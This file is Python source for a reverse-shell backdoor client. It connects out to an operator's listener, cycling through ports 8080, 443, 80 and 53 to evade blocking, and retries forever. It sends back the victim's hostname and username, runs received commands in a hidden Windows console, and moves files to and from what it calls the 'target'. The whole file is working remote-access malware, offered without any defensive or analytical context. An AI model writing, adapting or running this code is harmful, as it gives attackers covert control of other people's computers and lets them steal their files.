import json
import os
import socket
import subprocess
import time
import uuid

# Configuration
SERVER_IP = 'your.server.ip.here'  # Update to your listener's IP
PORT_LIST = [8080, 443, 80, 53]    # Port-hopping list for resilience
BUFFER_SIZE = 8192                # 8KB chunks for memory-safe I/O

def send_data(sock, data):
    """ Encodes and sends JSON data securely over the socket. """
    try:
        jsondata = json.dumps(data)
        sock.send(jsondata.encode('utf-8'))
    except (socket.error, Exception):
        pass

def recv_data(sock):
    """ Receives and decodes JSON data, handling potential fragmentation. """
    data = ''
    while True:
        try:
            chunk = sock.recv(BUFFER_SIZE).decode('utf-8')
            if not chunk:
                return None
            data += chunk
            return json.loads(data)
        except ValueError:
            # Continue if JSON is not yet complete
            continue
        except (socket.error, Exception):
            return None

def download_file(sock, file_name):
    """ Receives a file from the server in chunks to save RAM. """
    try:
        with open(file_name, 'wb') as f:
            sock.settimeout(2.0)
            while True:
                try:
                    chunk = sock.recv(BUFFER_SIZE)
                    if not chunk:
                        break
                    f.write(chunk)
                except socket.timeout:
                    break
        sock.settimeout(None)
    except Exception as e:
        send_data(sock, f"Download error: {str(e)}")

def upload_file(sock, file_name):
    """ Sends a file to the server using chunked I/O to prevent crashes. """
    if not os.path.exists(file_name):
        send_data(sock, "Error: File not found on target.")
        return

    try:
        with open(file_name, 'rb') as f:
            while True:
                chunk = f.read(BUFFER_SIZE)
                if not chunk:
                    break
                sock.send(chunk)
        time.sleep(0.2) # Short pause to clear buffer
    except Exception as e:
        send_data(sock, f"Upload error: {str(e)}")

def shell(sock):
    """ Main command loop logic. """
    # Check-in sequence
    hostname = socket.gethostname()
    user = os.environ.get("USERNAME") or "UnknownUser"
    send_data(sock, f"Handshake Successful: {hostname} as {user}")

    while True:
        command = recv_data(sock)
        if not command or command == 'kill':
            break
        
        if command == 'q':
            continue
            
        elif command.startswith('upload '):
            download_file(sock, command[7:].strip())
            
        elif command.startswith('download '):
            upload_file(sock, command[9:].strip())
            
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:].strip())
                send_data(sock, f"CWD: {os.getcwd()}")
            except Exception as e:
                send_data(sock, f"Path Error: {str(e)}")
                
        else:
            # Command Execution with CP437 for Windows 11 Compatibility
            try:
                su = subprocess.STARTUPINFO()
                su.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                su.wShowWindow = subprocess.SW_HIDE
                proc = subprocess.Popen(
                    command, 
                    startupinfo=su,
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                # Use cp437 and 'replace' errors to prevent crash on special characters
                result = (stdout + stderr).decode('cp437', errors='replace')
                send_data(sock, result if result else "Done (No Output).")
            except Exception as e:
                send_data(sock, f"Shell Error: {str(e)}")

def main():
    """ 
    Primary entry point with Port-Hopping and Auto-Reconnection.
    Ensures the service remains alive even if a port is blocked.
    """
    while True:
        for port in PORT_LIST:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                # 5-second connection attempt per port
                sock.settimeout(5.0)
                sock.connect((SERVER_IP, port))
                sock.settimeout(None) # Reset to blocking for the shell
                shell(sock)
            except (socket.error, Exception):
                # Clean up the failed socket before trying next port
                sock.close()
                continue
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # If all ports in PORT_LIST fail, wait before retrying the loop
        time.sleep(20)

if __name__ == "__main__":
    main()
